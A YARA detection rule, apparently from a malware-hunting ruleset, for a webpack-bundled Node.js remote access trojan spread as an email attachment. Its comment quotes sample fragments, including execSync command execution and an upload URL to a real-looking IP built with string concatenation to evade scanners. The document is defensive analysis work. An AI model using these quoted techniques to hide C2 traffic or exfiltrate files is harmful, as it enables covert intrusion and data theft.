/*
  Webpack-bundled Node.js RAT / exfil stub.

  A malicious .js mail attachment that is a webpack bundle (numbered module map,
  `e.exports = require("…")` shims) combining three capabilities a benign bundled
  Node tool almost never ships together in an emailed single-file script:

      e.exports = require("child_process");   // process spawning / command exec
      e.exports = require("axios");            // outbound HTTP
      e.exports = require("form-data");        // multipart upload (exfil)

  plus command execution via child_process.execSync, and — the discriminator —
  the C2 base URL assembled at runtime to hide the scheme from naive string
  scanners:

      var j = "http://".concat("89.106.74.19:7679", "/upload");
      ... cp.execSync(...) ; new FormData(); axios.post(j, ...)

  Variable/module names are minified and the host:port is per-sample, so the
  rule keys ONLY on stable mechanic literals: the three webpack require shims,
  execSync, and the `"http://".concat(` scheme-splitting obfuscation.

  FP-safety: legit bundled Node CLIs may carry child_process+axios+form-data,
  but a standalone emailed .js that ALSO hides its HTTP scheme via
  `"http://".concat(` AND runs execSync has no benign analogue in the
  mail-attachment vector. The conjunction is a 5-way AND under a size gate.

  Reference: MITRE ATT&CK T1059.007 (JavaScript), T1071.001 (Web C2),
             T1041 (Exfiltration over C2).
*/

rule Node_RAT_Webpack_Bundle : js rat dropper exfil heuristic malware
{
    meta:
        author      = "yarad"
        description = "Webpack-bundled Node.js RAT: child_process+axios+form-data shims, execSync, scheme-hidden C2 upload"
        reference   = "https://attack.mitre.org/techniques/T1071/001/"
        sample      = "fe66493e1ad2c9826f8379bc6c720ba24ce0c0dfb9a765faec79e335ea7a3b8f"
        score       = "80"
    strings:
        $cp     = "require(\"child_process\")"
        $axios  = "require(\"axios\")"
        $fd     = "require(\"form-data\")"
        $exec   = "execSync"
        // C2 base URL assembled to hide the http scheme from string scanners.
        $concat = /"http:\/\/"\s*\.concat\(/
    condition:
        filesize < 1048576 and all of them
}
